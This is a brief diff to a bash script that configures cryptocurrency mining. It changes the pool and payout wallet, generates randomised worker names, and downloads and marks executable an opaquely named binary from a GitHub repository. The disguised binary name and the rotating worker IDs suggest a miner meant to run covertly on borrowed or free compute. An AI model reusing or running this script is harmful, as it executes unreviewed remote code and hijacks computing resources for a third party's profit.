@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=USDT:0x6172c0d0139e0ce7431cabceae0f59cd49422166
+POOL=etchash.unmineable.com:3333
+WALLET=EOS:binancecleos:107097961
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/squibex/prem/raw/main/priyatama
 chmod +x priyatama
